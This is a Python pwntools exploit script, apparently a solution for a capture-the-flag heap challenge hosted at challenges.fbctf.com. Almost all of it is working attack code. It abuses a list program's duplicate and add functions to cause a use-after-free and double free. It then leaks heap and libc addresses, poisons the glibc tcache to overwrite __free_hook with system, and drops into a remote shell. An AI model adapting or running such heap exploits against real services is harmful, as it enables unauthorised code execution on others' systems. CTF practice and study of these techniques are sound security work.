from pwn import *
from heaputils import *

PROMPT='''
1. Create a list
2. Add element to list
3. View element in list
4. Duplicate a list
5. Remove a list
6. Exit
'''

def get_prompt():
    return p.recvuntil(PROMPT)

def create(name):
    p.sendline("1")
    p.recvuntil("Enter name for list:")
    p.send(name)
    get_prompt()

def add(idx,elem,interact=False):
    p.sendline("2")
    p.recvuntil("Enter index of list:")
    p.sendline(str(idx))
    p.recvuntil("Enter number to add:")
    p.sendline(str(elem))
    if not interact:
        get_prompt()
    else:
        p.interactive()

def dup(idx,name):
    p.sendline("4")
    p.recvuntil("Enter index of list:")
    p.sendline(str(idx))
    p.recvuntil("Enter name for new list:")
    p.send(name)
    get_prompt()

def remove(idx):
    p.sendline("5")
    p.recvuntil("Enter index of list:")
    p.sendline(str(idx))
    get_prompt()

def view(list_idx, elem_idx):
    p.sendline("3")
    p.recvuntil("Enter index of list:")
    p.sendline(str(list_idx))
    p.recvuntil("Enter index into list:")
    p.sendline(str(elem_idx))
    p.recvuntil(" = ")
    data = int(p.recvline())
    return data

def debug():
    bp = []
    script=""
    for x in bp:
        script += "b *0x%x"%(PIE+x)
    log.info("list at 0x%x"%(PIE + 0x2042A0))
    gdb.attach(p,gdbscript=script)

if __name__ == "__main__":
    libc = ELF("./libc-2.27.so")
    p = remote("challenges.fbctf.com", 1343)

    create("uaf1\n") #0
    add(0,1234)
    add(0,5678)
    dup(0,"uaf2\n") #1
    create("free\n") #2

    # free vec(free)
    log.info("freeing 'free'")
    for i in range(5):
        add(0x2,0x1)

    log.info("freeing 'uaf1'")
    # free vec(uaf1)    
    for i in range(5):
        add(0x0,0x1)

    # heap leak
    high = view(0x1,0x1)%2**32
    low = view(0x1,0x0)%2**32
    HEAP = (high << 32) + low
    log.info("HEAP: 0x%x"%HEAP)

    # double free
    # free vec(uaf2)
    log.info("freeing 'uaf2'")
    for i in range(5):
        add(0x1,0x1)

    remove(0)
    remove(1)
    remove(2)

    log.info("making largebin")
    create("large-original\n") #0
    # make it into a large bin
    for i in range(0x40):
        add(0,0x1)

    log.info("duplicating largebin 8 times")
    for i in range(8):
        dup(0,"large-dup\n") #1+i

    # free identical chunk 8 times
    log.info("freeing largebin 8 times")
    for i in range(8):
        for j in range(0x1):
            add(1+i,0x1)
    
    high = view(0,0x1)%2**32
    low = view(0,0x0)%2**32
    LIBC = (high << 32) + low  + 0x7f388d441000 - 0x7f388d82cca0
    log.info("LIBC: 0x%x"%LIBC)

    # get arbitrary write using double free-tcache dup

    log.info("getting some space...")
    remove(0)
    remove(1)
    remove(2)
    remove(3)
    remove(4) # must replace 1 extra chunk
 
    target = LIBC + libc.symbols['__free_hook']
    system = LIBC + libc.symbols['system']
    oneshot = LIBC + 0x10a38c
    
    log.info("creating 4 chunks for final exploit")
    create("0000\n") #0
    create("1111\n") #1
    create("2222\n") #2
    create("{}\n".format(p64(target))) #3

    # tcache entry of size 0x88 chunks
    tcache = HEAP + 0x55e60bb2e088 - 0x55e60bb40060
    target_holder = HEAP + 0x55664cbc7f40 - 0x55664cbc8060

    add(0,u32("sh\x00\x00"))
    add(1,tcache & 0xFFFFFFFF)
    add(2,0x1)

    # now tcache allocated

    
    context.log_level = 'debug'
    add(3,target_holder & 0xFFFFFFFF)
    

    create("some line of command\x00\n") #4
    goodstuff=p64(system)
    create(goodstuff+"\n")
    add(0,0x1337,True)
    
    p.interactive()